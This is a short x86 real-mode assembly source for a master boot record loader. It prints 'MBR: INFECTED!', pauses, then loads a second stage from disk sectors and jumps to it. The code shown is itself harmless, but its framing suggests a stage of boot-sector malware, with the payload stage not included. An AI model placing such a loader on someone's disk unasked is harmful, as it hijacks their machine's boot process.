[org 0x7C00]
[bits 16]

start:
    cli
    xor ax, ax
    mov ds, ax
    mov es, ax      ; Important: set ES segment!
    mov ss, ax
    mov sp, 0x7C00
    sti
    mov [boot_drive], dl

    ; Display "MBR INFECTED" message
    mov si, msg
    call print_str

    ; Delay for approximately 5 seconds
    mov cx, 5          ; 5 seconds
.delay_seconds:
    push cx
    mov cx, 0xFFFF     ; Inner loop count
.delay_loop:
    nop
    loop .delay_loop
    pop cx
    loop .delay_seconds

    ; Load Stage2 from LBA 2 (4 sectors = 2KB)
    mov ah, 0x02
    mov al, 4
    mov ch, 0
    mov cl, 3
    mov dh, 0
    mov dl, [boot_drive]
    mov bx, 0x8000
    int 0x13
    jc error

    jmp 0:0x8000

error:
    mov si, err_msg
    call print_str
    hlt

print_str:
    lodsb
    test al, al
    jz .done
    mov ah, 0x0E
    int 0x10
    jmp print_str
.done:
    ret

msg db "MBR: INFECTED!", 0
err_msg db "STG1 ERR!", 0
boot_drive db 0

times 510 - ($-$$) db 0
dw 0xAA55